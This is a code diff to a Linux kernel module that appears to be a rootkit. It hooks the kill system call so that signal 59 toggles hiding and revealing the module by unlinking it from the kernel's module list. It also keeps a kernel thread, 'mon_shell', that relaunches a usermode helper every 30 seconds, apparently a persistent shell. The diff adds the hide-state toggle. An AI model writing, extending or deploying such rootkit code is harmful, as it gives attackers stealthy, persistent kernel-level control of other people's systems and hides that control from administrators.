@@ -14,7 +14,11 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("GPL");
 MODULE_DESCRIPTION("GPL");
 
+enum {
+    SIGHIDE = 59
+};
 
+static int hide_status = 0;
 static asmlinkage long(*orig_kill)(const struct pt_regs *);
 
 static struct list_head *module_previous;
@@ -22,12 +26,14 @@ void module_hide(void)
 {
         module_previous = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
+        hide_status = 1;
 
 }
 
 void module_show(void)
 {
  list_add(&THIS_MODULE->list, module_previous);
+ hide_status = 0;
 }
 
 
@@ -37,8 +43,13 @@ static asmlinkage int hook_kill(const struct pt_regs *regs){
  int signal;
  signal = regs->si;
 
- if(signal == 59){
-  module_show();
+ if(signal == SIGHIDE){
+    if(hide_status == 1){
+        module_show();
+    }else{
+        module_hide();
+    }
+  
   return 0;
  }
 
@@ -60,7 +71,7 @@ int mon_shell(void *data) {     // Function that will be executed by the kernel 
                                 NULL, UMH_WAIT_EXEC);
 
 
-        ssleep(30);  // Waits 5 seconds before trying again.
+        ssleep(30);  // Waits 30 seconds before trying again.
     }
     return 0;  // Returns 0 when the thread finishes.
 }
